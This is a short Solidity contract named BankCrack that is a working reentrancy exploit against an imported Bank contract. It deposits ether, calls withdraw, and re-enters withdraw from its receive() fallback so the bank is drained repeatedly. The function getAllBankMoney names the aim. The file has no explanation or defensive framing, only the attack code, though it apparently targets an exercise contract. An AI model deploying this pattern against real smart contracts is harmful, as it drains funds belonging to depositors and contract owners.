// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'contracts/Bank.sol';

contract BankCrack {

  Bank b;

  constructor(address payable _b) public {
    b = Bank(_b);
  }

  function balance() public view returns (uint) {
    return address(this).balance;
  }

  function deposit() public payable {
    b.deposit.value(msg.value)(address(this));
  }

  function getAllBankMoney() public payable {
    b.withdraw(1);
  }

  receive() external payable {
    b.withdraw(1);
  }
}
